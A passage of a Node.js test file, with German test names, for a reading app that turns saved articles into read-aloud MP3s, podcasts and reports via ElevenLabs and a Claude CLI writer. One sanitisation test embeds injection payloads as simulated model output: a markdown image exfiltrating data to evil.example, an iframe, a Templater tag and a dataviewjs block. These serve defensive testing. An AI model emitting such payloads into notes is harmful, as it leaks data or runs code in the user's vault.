import { test } from 'node:test';
import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { mkdtempSync, rmSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createEpisodes, chunkText, dialogueBatches, stripId3, audioFrames, EpisodeError, DEFAULT_NOTE_FOLDER } from '../src/lesen/folgen.js';
import { parseRange, progressOf, clock, newSummary, episodeCard } from '../src/lesen/folgen-page.js';
import { createClaudeWriter, WriterError } from '../src/lesen/claude.js';
import { createReadingStore } from '../src/lesen/store.js';
import { readingRoutes } from '../src/lesen/http.js';
import { createSpeech } from '../src/lesen/tts.js';
import { listenAudio } from '../src/lesen/listen.js';

const quiet = { info() {}, warn() {}, error() {} };
const TTS = { key: 'sk', voice: 'Erz', model: 'eleven_multilingual_v2' };

function withDir(run) {
  const dir = mkdtempSync(join(tmpdir(), 'cockpit-folgen-'));
  return Promise.resolve(run(dir)).finally(() => rmSync(dir, { recursive: true, force: true }));
}

test('Folgen: Text in Stücke an Satzgrenzen, Gespräch in Abschnitte, ID3 weg, Range', () => {
  assert.deepEqual(chunkText('Eins. Zwei! Drei? Vier.', 12), ['Eins. Zwei!', 'Drei? Vier.']);
  assert.deepEqual(chunkText('Ein sehr langer Satz ohne Ende', 5), ['Ein sehr langer Satz ohne Ende'], 'zu langer Satz bleibt ganz');
  const batches = dialogueBatches([{ text: 'a'.repeat(10) + '.', voice: 'A' }, { text: 'Bb. Cc.', voice: 'B' }, { text: 'Dd.', voice: 'A' }], 15);
  assert.deepEqual(batches, [[{ text: 'a'.repeat(10) + '.', voice: 'A' }], [{ text: 'Bb. Cc.', voice: 'B' }, { text: 'Dd.', voice: 'A' }]]);

  const tagged = Buffer.concat([Buffer.from('ID3'), Buffer.from([4, 0, 0, 0, 0, 0, 2]), Buffer.from('xx'), Buffer.from('MP3')]);
  assert.equal(String(stripId3(tagged)), 'MP3');
  assert.equal(String(stripId3(Buffer.from('MP3'))), 'MP3');

  assert.equal(parseRange(null, 100), null);
  assert.deepEqual(parseRange('bytes=0-1', 100), [0, 1]);
  assert.deepEqual(parseRange('bytes=90-', 100), [90, 99]);
  assert.deepEqual(parseRange('bytes=-10', 100), [90, 99]);
  assert.deepEqual(parseRange('bytes=0-999', 100), [0, 99]);
  assert.equal(parseRange('bytes=200-300', 100), false);
});

/** MPEG-1 Layer III, 128 kbit/s, 44,1 kHz, mono: 417 Bytes je Frame; `tag` macht daraus einen Info-Frame wie vom Encoder. */
function frame(fill, tag = null) {
  const f = Buffer.alloc(417, fill);
  f.set([0xff, 0xfb, 0x90, 0xc0]);
  if (tag) f.write(tag, 4 + 17, 'latin1');
  return f;
}
const id3 = Buffer.concat([Buffer.from('ID3'), Buffer.from([4, 0, 0, 0, 0, 0, 3]), Buffer.from('abc')]);

test('Folgen: MP3-Stücke ohne ID3 und Info-Frame, sonst stimmt die Länge auf iOS nicht', () => {
  const piece = (n) => Buffer.concat([id3, frame(0, 'Info'), ...Array.from({ length: n }, (_, i) => frame(i + 1))]);
  const clean = audioFrames(piece(3));
  assert.equal(clean.length, 3 * 417, 'nur die Audio-Frames');
  assert.equal(clean[4], 1);
  assert.doesNotMatch(clean.toString('latin1'), /Info|ID3/);
  // Eine alte Folge: Stücke aneinander, Info-Frames mitten im Strom.
  const old = Buffer.concat([piece(2), stripId3(piece(2)), stripId3(piece(1))]);
  assert.equal(audioFrames(old).length, 5 * 417);
  assert.ok(audioFrames(audioFrames(old)).equals(audioFrames(old)), 'zweimal bereinigt bleibt gleich');
  assert.equal(String(audioFrames(Buffer.from('[kein MP3]'))), '[kein MP3]');
  assert.equal(String(audioFrames(Buffer.concat([id3, Buffer.from('MP3')]))), 'MP3');
});

test('Folgen: fertige ältere Folge wird beim Start bereinigt', () =>
  withDir(async (dir) => {
    const at = '2026-10-23T09:00:00Z';
    const old = Buffer.concat([id3, frame(0, 'Info'), frame(1), frame(0, 'Info'), frame(2)]);
    writeFileSync(join(dir, 'f1.mp3'), old);
    writeFileSync(join(dir, 'folgen.json'), JSON.stringify([{ id: 'f1', kind: 'podcast', minutes: 5, title: 'Alt', docs: [], status: 'fertig', bytes: old.length, created_at: at, updated_at: at }]));
    const { episodes } = setup(dir);
    await new Promise((res) => setTimeout(res, 1700));
    const ep = episodes.get('f1');
    assert.equal(ep.frames, true);
    assert.equal(ep.bytes, 2 * 417);
    assert.equal(readFileSync(join(dir, 'f1.mp3')).length, 2 * 417);
  }));

/**
 * Stapel mit zwei Texten, falsches ElevenLabs, falscher Claude, falscher Vault:
 * Nur „Vom Lesen“ hat eine Lesestapel-Notiz. `taken`: Pfade, die es im Vault
 * schon gibt; `options` ersetzt Optionen von `createEpisodes`.
 */
function setup(dir, { tts = TTS, writer = null, failDialogue = () => false, failSpeech = () => false, before = () => {}, taken = [], options = {} } = {}) {
  const store = createReadingStore({ path: ':memory:' });
  const a = store.addDocument({ url: 'https://blatt.test/a', title: 'Vom Lesen', site: 'blatt.test', status: 'stapel', reading_minutes: 3, content_html: '<p>Erster Satz hier. Zweiter Satz dort.</p>' }).doc;
  const b = store.addDocument({ url: 'https://blatt.test/b', title: 'Vom Hören', status: 'stapel', reading_minutes: 2, content_html: '<p>Hören geht auch.</p>' }).doc;
  const calls = { speech: [], dialogue: [], writes: [], notes: [], heard: [] };
  const files = new Set(taken);
  const provider = (cfg) => ({
    name: 'ElevenLabs',
    id: `el\n${cfg.voice}`,
    synthesize: async (input) => {
      if (failSpeech(calls.speech.length)) throw new Error('ElevenLabs nicht erreichbar (ETIMEDOUT)');
      calls.speech.push({ ...input, cfg });
      return Buffer.from(`[${input.text}]`);
    },
    dialogue: async ({ inputs }) => {
      if (failDialogue(calls.dialogue.length)) throw new Error('ElevenLabs nicht erreichbar (ETIMEDOUT)');
      calls.dialogue.push(inputs);
      return Buffer.from(inputs.map((i) => `${i.voice}:${i.text}`).join('|'));
    },
  });
  const fakeWriter = writer ?? {
    available: () => true,
    write: async (job) => {
      calls.writes.push(job);
      if (job.schema.required.includes('turns')) return { title: 'Lesen und Hören', turns: [{ speaker: 'A', text: 'Willkommen.' }, { speaker: 'B', text: 'Danke.' }, { speaker: 'A', text: '  ' }] };
      return { title: 'Report/Woche', note: '## Überblick\n\nZwei Texte.', spoken: 'Zwei Texte. Beide kurz.' };
    },
  };
  before({ a, b });
  let current = tts;
  const speech = createSpeech({ settings: () => current, provider, logger: quiet });
  const episodes = createEpisodes({
    dir,
    store,
    tts: () => current,
    speech,
    voices: () => ({ host: 'Host', guest: 'Gast' }),
    writer: fakeWriter,
    // Wie der Vault-Editor: wirft, wenn es die Datei schon gibt.
    createNote: async ({ folder, name, content }) => {
      const path = `${folder}/${name}`;
      if (files.has(path)) throw new Error(`In „${folder}“ gibt es schon eine Notiz „${name}“`);
      files.add(path);
      calls.notes.push({ folder, name, content });
      return { path, changed: true };
    },
    sourceNote: (id) => (id === a.id ? '30-ressourcen/lesestapel/vom-lesen.md' : null),
    heard: async (ids) => {
      calls.heard.push(ids);
    },
    provider,
    logger: quiet,
    now: () => new Date('2026-10-23T10:00:00Z'),
    ...options,
  });
  return { store, a, b, episodes, calls, speech, setTts: (v) => (current = v) };
}

test('Folgen: Vorlesen spricht die ganzen Texte mit der Erzählerstimme, eine MP3', () =>
  withDir(async (dir) => {
    const { a, b, episodes, calls } = setup(dir);
    const ep = episodes.create({ kind: 'vorlesen', docIds: [a.id, b.id, a.id, 'gibtsnicht'] });
    assert.equal(ep.status, 'wartet');
    assert.equal(ep.title, 'Vorlesen: Vom Lesen und 1 weitere');
    await ep.done;
    const done = episodes.get(ep.id);
    assert.equal(done.status, 'fertig');
    assert.deepEqual(calls.speech.map((c) => c.text), ['Vom Lesen. Von blatt.test. <break time="1.5s" />', 'Erster Satz hier.', 'Zweiter Satz dort.', 'Vom Hören. <break time="1.5s" />', 'Hören geht auch.']);
    assert.deepEqual([calls.speech[1].previous, calls.speech[1].next], [null, 'Zweiter Satz dort.'], 'Nachbarn wie beim Streamen');
    assert.equal(String(readFileSync(episodes.audioPath(ep.id))), calls.speech.map((c) => `[${c.text}]`).join(''), 'Reihenfolge bleibt, auch parallel');
    assert.equal(done.total, 5);
    assert.equal(done.bytes, readFileSync(episodes.audioPath(ep.id)).length);
    assert.equal(episodes.list()[0].id, ep.id);
    assert.deepEqual(calls.heard, [[a.id, b.id]], 'Vermerk „gehört“');
    assert.equal(calls.notes.length, 0, 'Vorlesen ohne Notiz');
    assert.equal(done.note, undefined);
  }));

test('Folgen: Vorlesen bezahlt nur, was nicht schon gestreamt oder offline geladen wurde', () =>
  withDir(async (dir) => {
    const { store, a, episodes, calls, speech } = setup(dir);
    // Ersten Satz vorher gestreamt, wie /lesen/hoeren/audio bzw. /api/app/audio.
    await listenAudio(store, speech, { id: a.id, von: '0', bis: '17' });
    assert.equal(calls.speech.length, 1);
    const head = 'Vom Lesen. Von blatt.test. <break time="1.5s" />'.length;
    const preview = episodes.preview({ kind: 'vorlesen', docIds: [a.id] });
    assert.equal(preview.chars, head + 'Zweiter Satz dort.'.length, 'Schätzung ohne den gehörten Satz');
    const ep = episodes.create({ kind: 'vorlesen', docIds: [a.id] });
    await ep.done;
    assert.deepEqual(calls.speech.slice(1).map((c) => c.text), ['Vom Lesen. Von blatt.test. <break time="1.5s" />', 'Zweiter Satz dort.'], 'gehörter Satz kommt aus dem Cache');
    assert.equal(episodes.get(ep.id).chars, preview.chars, 'berechnete Zeichen');
    assert.equal(String(readFileSync(episodes.audioPath(ep.id))), '[Vom Lesen. Von blatt.test. <break time="1.5s" />][Erster Satz hier.][Zweiter Satz dort.]');

    // Noch einmal: alles im Cache, kostet nichts.
    const again = episodes.create({ kind: 'vorlesen', docIds: [a.id] });
    assert.equal(again.chars, 0);
    await again.done;
    assert.equal(calls.speech.length, 3);
  }));

test('Folgen: Podcast mit zwei Stimmen über Text-to-Dialogue, Texte gehen an Claude', () =>
  withDir(async (dir) => {
    const { a, b, episodes, calls } = setup(dir);
    const ep = episodes.create({ kind: 'podcast', docIds: [a.id, b.id], minutes: 5 });
    assert.equal(ep.chars, 4500, 'Schätzung: 900 Zeichen je Minute');
    await ep.done;
    const done = episodes.get(ep.id);
    assert.equal(done.status, 'fertig', done.error);
    assert.equal(done.title, 'Lesen und Hören');
    assert.match(calls.writes[0].prompt, /etwa 5 Minuten/);
    assert.match(calls.writes[0].input, /<text nr="1" titel="Vom Lesen" quelle="https:\/\/blatt\.test\/a">\nErster Satz hier\. Zweiter Satz dort\.\n<\/text>/);
    assert.deepEqual(calls.dialogue, [[{ text: 'Willkommen.', voice: 'Host' }, { text: 'Danke.', voice: 'Gast' }]]);
    assert.equal(String(readFileSync(episodes.audioPath(ep.id))), 'Host:Willkommen.|Gast:Danke.');
    assert.equal(calls.speech.length, 0);

    // Transkript im Vault, neben den Audio-Reports.
    assert.equal(calls.notes.length, 1);
    assert.equal(calls.notes[0].folder, DEFAULT_NOTE_FOLDER);
    assert.equal(calls.notes[0].name, '2026-10-23-podcast-lesen-und-hoeren.md');
    assert.equal(done.note, '30-ressourcen/audio-reports/2026-10-23-podcast-lesen-und-hoeren.md');
    assert.equal(
      calls.notes[0].content,
      [
        '---',
        'type: folge',
        'art: podcast',
        'titel: "Lesen und Hören"',
        `folge_id: "${ep.id}"`,
        'erzeugt: 2026-10-23',
        'minuten: 5',
        'quellen:',
        '  - "[[30-ressourcen/lesestapel/vom-lesen]]"',
        'ingest: offen',
        '---',
        '',
        '# Lesen und Hören',
        '',
        '_Podcast aus dem Lesestapel, 2026-10-23, 2 Texte (Cockpit)_',
        '',
        '## Gespräch',
        '',
        '**Moderation:** Willkommen.',
        '',
        '**Gast:** Danke.',
        '',
        '## Quellen',
        '',
        '- [[30-ressourcen/lesestapel/vom-lesen|Vom Lesen]]',
        '- [Vom Hören](<https://blatt.test/b>)',
        '',
      ].join('\n'),
    );
    assert.deepEqual(calls.heard, [[a.id, b.id]]);

    const ctx = { tz: 'Europe/Berlin', write: { csrf: 'c' } };
    assert.match(episodeCard(done, { ctx }), /<a href="\/notiz\?pfad=30-ressourcen%2Faudio-reports%2F2026-10-23-podcast-lesen-und-hoeren\.md" class="btn quiet">Im Vault<\/a>/);
  }));

test('Folgen: Report als Notiz im Vault mit Sprechfassung, eine Stimme liest sie; zweiter Versuch legt nichts doppelt an', () =>
  withDir(async (dir) => {
    // Das Sprechen scheitert beim ersten Versuch, die Notiz ist da schon angelegt.
    let failures = 1;
    const { a, episodes, calls } = setup(dir, { failSpeech: () => failures-- > 0 });
    const ep = episodes.create({ kind: 'report', docIds: [a.id], minutes: 10 });
    await ep.done;
    assert.equal(episodes.get(ep.id).status, 'fehler');
    assert.equal(calls.notes.length, 1, 'Notiz vor dem Sprechen');
    assert.equal(calls.heard.length, 0, 'nicht fertig, nicht gehört');

    await episodes.retry(ep.id).done;
    const done = episodes.get(ep.id);
    assert.equal(done.status, 'fertig', done.error);
    assert.equal(done.title, 'Report Woche', 'ohne Pfadtrenner');
    assert.equal(calls.notes.length, 1, 'keine zweite Notiz');
    assert.equal(done.note, '30-ressourcen/audio-reports/2026-10-23-report-report-woche.md');
    const { content } = calls.notes[0];
    assert.match(content, /^---\ntype: folge\nart: report\ntitel: "Report Woche"\nfolge_id: "[0-9a-f-]+"\nerzeugt: 2026-10-23\nminuten: 10\nquellen:\n {2}- "\[\[30-ressourcen\/lesestapel\/vom-lesen\]\]"\ningest: offen\n---\n/);
    assert.match(
      content,
      /\n---\n\n# Report Woche\n\n_Report aus dem Lesestapel, 2026-10-23, 1 Text \(Cockpit\)_\n\n## Überblick\n\nZwei Texte\.\n\n## Sprechfassung\n\nZwei Texte\. Beide kurz\.\n\n## Quellen\n\n- \[\[30-ressourcen\/lesestapel\/vom-lesen\|Vom Lesen\]\]\n$/,
    );
    assert.deepEqual(calls.speech.map((c) => [c.text, c.cfg.voice]), [['Zwei Texte. Beide kurz.', 'Erz']]);
    assert.deepEqual(calls.heard, [[a.id]]);
  }));

test('Folgen: Dateiname schon vergeben → mit Kurz-ID; Datum in der Zeitzone; Quellen ohne Lesestapel-Notiz nur als Link', () =>
  withDir(async (dir) => {
    const taken = ['30-ressourcen/audio-reports/2026-10-24-report-report-woche.md'];
    const { b, episodes, calls } = setup(dir, { taken, options: { tz: 'Pacific/Kiritimati' } });
    const ep = episodes.create({ kind: 'report', docIds: [b.id], minutes: 5 });
    await ep.done;
    const done = episodes.get(ep.id);
    assert.equal(done.status, 'fertig', done.error);
    assert.equal(done.note, `30-ressourcen/audio-reports/2026-10-24-report-report-woche-${ep.id.slice(0, 8)}.md`);
    assert.match(calls.notes[0].content, /\nerzeugt: 2026-10-24\n/);
    assert.match(calls.notes[0].content, /\nquellen: \[\]\n/);
    assert.match(calls.notes[0].content, /## Quellen\n\n- \[Vom Hören\]\(<https:\/\/blatt\.test\/b>\)\n$/);
  }));

test('Folgen: ohne Vault-Optionen keine Notiz; scheitert der Vermerk „gehört“, bleibt die Folge fertig', () =>
  withDir(async (dir) => {
    const plain = setup(dir, { options: { createNote: undefined, sourceNote: undefined, heard: undefined } });
    const ep = plain.episodes.create({ kind: 'report', docIds: [plain.a.id], minutes: 5 });
    await ep.done;
    assert.equal(plain.episodes.get(ep.id).status, 'fertig', plain.episodes.get(ep.id).error);
    assert.equal(plain.episodes.get(ep.id).note, undefined);
    assert.equal(plain.calls.notes.length, 0);

    const warnings = [];
    const heard = () => {
      throw new Error('Index weg');
    };
    const failing = setup(join(dir, 'b'), { options: { heard, logger: { ...quiet, warn: (m) => warnings.push(m) } } });
    const ep2 = failing.episodes.create({ kind: 'podcast', docIds: [failing.a.id], minutes: 5 });
    await ep2.done;
    assert.equal(failing.episodes.get(ep2.id).status, 'fertig');
    assert.match(warnings.join('\n'), /gehört.*Index weg/);
  }));

test('Folgen: lässt sich das Transkript nicht anlegen (Vault nur lesbar, Ordner vertraulich), läuft die Folge ohne weiter', () =>
  withDir(async (dir) => {
    const warnings = [];
    const createNote = async () => {
      throw new Error('EROFS: read-only file system');
    };
    const { a, episodes, calls } = setup(dir, { options: { createNote, logger: { ...quiet, warn: (m) => warnings.push(m) } } });
    const ep = episodes.create({ kind: 'report', docIds: [a.id], minutes: 5 });
    await ep.done;
    const done = episodes.get(ep.id);
    assert.equal(done.status, 'fertig', done.error);
    assert.equal(done.note, null);
    assert.equal(calls.speech.length, 1, 'ElevenLabs lief trotzdem');
    assert.match(warnings.join('\n'), /Transkript nicht im Vault: EROFS/);
  }));

test('Folgen: Claudes Text im Transkript ist entschärft (fremde Bilder, HTML, Templater, dataviewjs)', () =>
  withDir(async (dir) => {
    const writer = {
      available: () => true,
      write: async () => ({
        title: 'Woche <% tp.date.now() %>',
        note: '## Überblick\n\n![x](https://evil.example/?d=geheim) <iframe src="https://evil.example"></iframe>\n\n```dataviewjs\ndv.paragraph(1)\n```',
        spoken: 'Zwei Texte.',
      }),
    };
    const { a, episodes, calls } = setup(dir, { writer });
    await episodes.create({ kind: 'report', docIds: [a.id], minutes: 5 }).done;
    const { content } = calls.notes[0];
    assert.doesNotMatch(content, /!\[x\]|<iframe|<%|```dataviewjs/);
    assert.match(content, /\n\[x\]\(https:\/\/evil\.example\/\?d=geheim\) &lt;iframe src="https:\/\/evil\.example">&lt;\/iframe>\n\n```text\ndv\.paragraph\(1\)\n```\n/);
    assert.match(content, /^titel: "Woche <​% tp\.date\.now\(\) %>"$/m);
  }));

test('Folgen: Zeitzone als Funktion – eine geänderte Einstellung gilt ohne Neustart', () =>
  withDir(async (dir) => {
    let zone = 'Europe/Berlin';
    const { a, episodes, calls } = setup(dir, { options: { tz: () => zone, now: () => new Date('2026-10-23T23:30:00Z') } });
    await episodes.create({ kind: 'report', docIds: [a.id], minutes: 5 }).done;
    zone = 'America/New_York';
    await episodes.create({ kind: 'report', docIds: [a.id], minutes: 5 }).done;
    assert.deepEqual(calls.notes.map((n) => /\nerzeugt: (\S+)\n/.exec(n.content)[1]), ['2026-10-24', '2026-10-23']);
  }));

test('Folgen: ohne Stimme oder Claude nicht anlegbar, Fehler bleibt stehen, Löschen', () =>
  withDir(async (dir) => {
    const failing = { available: () => true, write: async () => { throw new WriterError('Claude: Limit erreicht'); } };
    const { a, episodes, setTts } = setup(dir, { writer: failing });
    const ep = episodes.create({ kind: 'podcast', docIds: [a.id] });
    await ep.done;
    assert.equal(episodes.get(ep.id).status, 'fehler');
    assert.equal(episodes.get(ep.id).error, 'Claude: Limit erreicht');
    assert.equal(episodes.audioPath(ep.id), null);
    episodes.remove(ep.id);
    assert.equal(episodes.get(ep.id), null);

    assert.throws(() => episodes.create({ kind: 'podcast', docIds: [a.id], minutes: 7 }), /Länge/);
    assert.throws(() => episodes.create({ kind: 'film', docIds: [a.id] }), /Unbekannte Art/);
    assert.throws(() => episodes.create({ kind: 'vorlesen', docIds: ['x'] }), /Keiner der gewählten Texte/);
    setTts(null);
    assert.throws(() => episodes.create({ kind: 'vorlesen', docIds: [a.id] }), (e) => e instanceof EpisodeError && e.status === 409 && /ElevenLabs/.test(e.message));

    const noClaude = setup(join(dir, 'b'), { writer: { available: () => false } });
    assert.match(noClaude.episodes.availability().report, /CLAUDE_CODE_OAUTH_TOKEN/);
    assert.equal(noClaude.episodes.availability().vorlesen, null);
  }));

test('Folgen: nach einem Fehler geht es weiter, ohne Claude oder Gesprochenes noch einmal zu bezahlen', () =>
  withDir(async (dir) => {
    const long = (n) => `${'Satz. '.repeat(n)}`.trim();
    const writer = {
      available: () => true,
      write: async (job) => {
        writes.push(job);
        return { title: 'Lang', turns: [{ speaker: 'A', text: long(250) }, { speaker: 'B', text: long(250) }, { speaker: 'A', text: long(250) }] };
      },
    };
    const writes = [];
    // Der zweite Abschnitt scheitert beim ersten Versuch.
    let failures = 1;
    const { a, episodes, calls } = setup(dir, { writer, failDialogue: (n) => n === 1 && failures-- > 0 });
    const ep = episodes.create({ kind: 'podcast', docIds: [a.id], minutes: 5 });
    await ep.done;
    const failed = episodes.get(ep.id);
    assert.equal(failed.status, 'fehler');
    assert.match(failed.error, /ETIMEDOUT/);
    assert.equal(failed.done, 1);
    assert.equal(failed.total, 3);
    assert.equal(calls.notes.length, 1, 'Transkript schon vor dem Sprechen im Vault');
    assert.ok(episodes.resumable(ep.id), 'Skript liegt bereit');
    assert.ok(existsSync(join(dir, `${ep.id}.mp3.part`)), 'Gesprochenes bleibt');

    const again = episodes.retry(ep.id);
    assert.equal(again.status, 'wartet');
    await again.done;
    const done = episodes.get(ep.id);
    assert.equal(done.status, 'fertig', done.error);
    assert.equal(writes.length, 1, 'Claude nur einmal');
    assert.equal(calls.notes.length, 1, 'Transkript nur einmal');
    assert.equal(calls.dialogue.length, 3, 'jeder Abschnitt genau einmal');
    const audio = String(readFileSync(episodes.audioPath(ep.id)));
    assert.equal(audio, calls.dialogue.map((inputs) => inputs.map((i) => `${i.voice}:${i.text}`).join('|')).join(''), 'Reihenfolge bleibt');
    assert.equal(existsSync(join(dir, `${ep.id}.skript.json`)), false, 'Skript nach dem Fertigwerden weg');
    assert.throws(() => episodes.retry(ep.id), /fehlgeschlagene/);
  }));

test('Folgen: nach einem Neustart läuft weiter, was ohne Claude geht; sonst bleibt ein Fehler', () =>
  withDir(async (dir) => {
    const at = '2026-10-23T09:00:00Z';
    const before = ({ a }) => {
      writeFileSync(
        join(dir, 'folgen.json'),
        JSON.stringify([
          { id: 'x1', kind: 'podcast', minutes: 5, title: 'Ohne Skript', docs: [a.id], status: 'schreibt', chars: 10, created_at: at, updated_at: at },
          { id: 'x2', kind: 'podcast', minutes: 5, title: 'Mit Skript', docs: [a.id], status: 'spricht', done: 0, total: 1, chars: 10, created_at: at, updated_at: at },
          { id: 'x3', kind: 'vorlesen', title: 'Fertig', docs: [], status: 'fertig', chars: 10, created_at: at, updated_at: at },
        ]),
      );
      writeFileSync(join(dir, 'x2.skript.json'), JSON.stringify({ title: 'Gerettet', turns: [{ speaker: 'A', text: 'Hallo.' }, { speaker: 'B', text: 'Hi.' }] }));
    };
    const { episodes, calls } = setup(dir, { before });
    assert.equal(episodes.get('x1').status, 'fehler');
    assert.match(episodes.get('x1').error, /Neustart/);
    assert.equal(episodes.resumable('x1'), false);
    assert.equal(episodes.get('x2').status, 'wartet', 'mit Skript gleich wieder eingereiht');
    assert.equal(episodes.get('x3').status, 'fertig');
    // Die Warteschlange startet eine Sekunde nach dem Aufbau.
    await new Promise((res) => setTimeout(res, 1200));
    assert.equal(episodes.get('x2').status, 'fertig', episodes.get('x2').error);
    assert.equal(episodes.get('x2').title, 'Gerettet');
    assert.equal(calls.writes.length, 0, 'Claude wird nicht gefragt');
    assert.match(calls.notes[0]?.content ?? '', /# Gerettet\n[\s\S]*\*\*Moderation:\*\* Hallo\.\n\n\*\*Gast:\*\* Hi\./, 'Transkript aus dem geretteten Skript');
    assert.equal(String(readFileSync(episodes.audioPath('x2'))), 'Host:Hallo.|Gast:Hi.');
  }));

test('Folgen: Fortschritt in Schritten, Prozent und Restzeit statt „1 von 4“', () => {
  const t0 = Date.parse('2026-10-23T10:00:00Z');
  const waiting = progressOf({ kind: 'podcast', status: 'wartet' }, t0);
  assert.deepEqual([waiting.steps, waiting.step, waiting.percent], [['Eingereiht', 'Claude schreibt', 'Stimmen sprechen', 'Fertig'], 0, null]);
  const writing = progressOf({ kind: 'report', status: 'schreibt', writing_at: '2026-10-23T09:58:00Z' }, t0);
  assert.equal(writing.step, 1);
  assert.equal(writing.percent, null);
  assert.match(writing.label, /Claude schreibt den Report, seit 2 Min\./);
  const speaking = progressOf({ kind: 'podcast', status: 'spricht', done: 1, total: 4, speaking_at: '2026-10-23T09:59:00Z', speaking_from: 0 }, t0);
  assert.deepEqual([speaking.step, speaking.percent], [2, 25]);
  assert.match(speaking.label, /25 %, noch etwa 3 Min\./);
  const reading = progressOf({ kind: 'vorlesen', status: 'spricht', done: 0, total: 10 }, t0);
  assert.deepEqual([reading.steps.length, reading.step, reading.percent], [3, 1, 0]);
  assert.deepEqual(newSummary({ kind: 'podcast', texts: 3, chars: 0, minutes: 10 }), { main: 'Podcast · 3 Texte · 10 Min.', cost: 'rund 9.000 Zeichen bei ElevenLabs, dazu dein Claude-Abo' });
  assert.deepEqual(newSummary({ kind: 'vorlesen', texts: 1, chars: 1800, minutes: 10 }), { main: 'Vorlesen · 1 Text · etwa 2 Min.', cost: 'rund 1.800 Zeichen bei ElevenLabs' });
  assert.equal(newSummary({ kind: 'vorlesen', texts: 2, chars: 0 }).cost, 'Schon alles gehört, kostet nichts');
  assert.equal(newSummary({ kind: 'report', texts: 0 }).main, 'Bitte mindestens einen Text wählen');
  assert.equal(clock(75), '1:15');
  assert.equal(clock(3725), '1:02:05');
});

test('Folgen: Seiten ohne JavaScript, Anlegen per Formular, Audio mit Range', () =>
  withDir(async (dir) => {
    const { store, a, b, episodes } = setup(dir);
    const routes = readingRoutes({ store, episodes, logger: quiet });
    const ctx = (path, range = null) => ({ url: new URL(`https://vault.test${path}`), range, user: 'ruben', tz: 'Europe/Berlin', write: { csrf: 'c', back: path }, flash: null });
    const page = (path, range) => routes.pages[new URL(`https://vault.test${path}`).pathname](ctx(path, range));

    const neu = (await page('/lesen/folgen/neu?zeit=15')).html;
    assert.match(neu, new RegExp(`name="doc" value="${a.id}" checked`));
    assert.match(neu, new RegExp(`name="doc" value="${b.id}" checked`));
    assert.match(neu, /name="art" value="vorlesen" checked/);
    assert.match(neu, /rund \d+ Zeichen bei ElevenLabs/);
    assert.match(neu, /<input type="radio" name="laenge" value="10" checked>/, 'Länge als Auswahl statt Liste');
    assert.match(neu, /data-chars="\d+"/, 'Zeichen je Text für die Zusammenfassung');
    assert.match(neu, /lesen-folgen\.js/);
    assert.match((await page('/lesen/stapel?zeit=15')).html, /href="\/lesen\/folgen\/neu\?zeit=15" class="btn quiet">Folge erzeugen/);

    const form = new URLSearchParams([['art', 'vorlesen'], ['doc', a.id], ['laenge', '10']]);
    const r = await routes.actions['/aktion/lesen/folge/neu'](form, { sub: 'ruben' });
    assert.equal(r.redirect, '/lesen/folgen');
    assert.match(r.message, /^Vorlesen entsteht im Hintergrund/);
    await assert.rejects(routes.actions['/aktion/lesen/folge/neu'](new URLSearchParams([['art', 'podcast'], ['doc', a.id], ['laenge', '3']]), {}), /Länge/);

    await new Promise((res) => setTimeout(res, 20));
    const [ep] = episodes.list();
    assert.equal(ep.status, 'fertig');
    const list = (await page('/lesen/folgen')).html;
    assert.match(list, new RegExp(`data-src="/lesen/folgen/audio\\?id=${ep.id}"`));
    assert.match(list, /<button type="button" class="folge-play" data-play aria-label="Abspielen: Vorlesen: Vom Lesen" hidden>/, 'Knopf für den Player');
    assert.match(list, new RegExp(`<a href="/lesen/folgen/audio\\?id=${ep.id}" class="folge-play folge-nojs"`), 'ohne JavaScript: Link auf die MP3');
    assert.match(list, /lesen-folgen\.js/);
    assert.doesNotMatch(list, /<audio/);

    const stand = await page('/lesen/folgen/stand');
    assert.equal(stand.headers['content-type'], 'application/json; charset=utf-8');
    const items = JSON.parse(stand.body).items;
    assert.deepEqual(items.map((i) => [i.id, i.status, i.busy]), [[ep.id, 'fertig', false]]);
    assert.match(items[0].html, /^<li class="folge is-ready"/);

    const full = await page(`/lesen/folgen/audio?id=${ep.id}`);
    assert.equal(full.status, 200);
    assert.equal(full.headers['accept-ranges'], 'bytes');
    const part = await page(`/lesen/folgen/audio?id=${ep.id}`, 'bytes=0-1');
    assert.equal(part.status, 206);
    assert.equal(part.body.length, 2);
    assert.equal(part.headers['content-range'], `bytes 0-1/${full.body.length}`);
    assert.equal((await page(`/lesen/folgen/audio?id=${ep.id}`, 'bytes=9999-')).status, 416);
    assert.equal((await page('/lesen/folgen/audio?id=gibtsnicht')).status, 404);

    await routes.actions['/aktion/lesen/folge/loeschen'](new URLSearchParams({ id: ep.id }), {});
    assert.match((await page('/lesen/folgen')).html, /Noch keine Folgen/);
  }));

/** Kindprozess-Attrappe für `claude -p`. */
function fakeClaude(answer, { code = 0 } = {}) {
  const seen = {};
  const run = (command, args, opts) => {
    Object.assign(seen, { command, args, opts });
    const child = new EventEmitter();
    child.stdout = new PassThrough();
    child.stderr = new PassThrough();
    child.stdin = new PassThrough();
    let input = '';
    child.stdin.on('data', (d) => (input += d));
    child.stdin.on('finish', () => {
      seen.input = input;
      child.stdout.end(typeof answer === 'string' ? answer : JSON.stringify(answer));
      child.stderr.end();
      setImmediate(() => child.emit('close', code));
    });
    child.kill = () => {};
    return child;
  };
  return { run, seen };
}

test('Claude-Writer: ohne Werkzeuge, mit Abo-Token statt API-Key, Ergebnis aus structured_output', async () => {
  process.env.ANTHROPIC_API_KEY = 'sk-ant-fremd';
  try {
    const { run, seen } = fakeClaude({ type: 'result', subtype: 'success', is_error: false, result: '', structured_output: { title: 'T' }, num_turns: 2 });
    const writer = createClaudeWriter({ token: 'oat-abo', model: () => 'sonnet', run, logger: quiet });
    assert.equal(writer.available(), true);
    const out = await writer.write({ system: 'S', prompt: 'P', input: 'Texte', schema: { type: 'object' } });
    assert.deepEqual(out, { title: 'T' });
    assert.equal(seen.command, 'claude');
    assert.equal(seen.input, 'Texte');
    const a = seen.args;
    assert.deepEqual(a.slice(0, 2), ['-p', 'P']);
    for (const [flag, value] of [['--output-format', 'json'], ['--json-schema', '{"type":"object"}'], ['--system-prompt', 'S'], ['--tools', ''], ['--permission-mode', 'dontAsk'], ['--model', 'sonnet']]) {
      assert.equal(a[a.indexOf(flag) + 1], value, flag);
    }
    for (const flag of ['--safe-mode', '--strict-mcp-config', '--no-session-persistence']) assert.ok(a.includes(flag), flag);
